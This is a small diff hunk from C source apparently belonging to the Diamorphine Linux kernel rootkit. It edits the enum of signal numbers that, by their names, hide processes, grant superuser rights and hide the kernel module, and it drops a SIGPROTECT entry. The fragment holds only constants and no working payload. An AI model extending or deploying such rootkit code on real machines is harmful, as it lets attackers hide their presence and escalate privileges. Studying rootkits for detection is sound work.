@@ -39,12 +39,10 @@ struct linux_dirent {
 
 #define MODULE_NAME "diamorphine"
 
-
 enum {
 	SIGINVIS = 31,
 	SIGSUPER = 64,
-	SIGMODINVIS = 63,
-	SIGPROTECT = 62,
+	SIGMODINVIS = 63
 };
 
 #ifndef IS_ENABLED
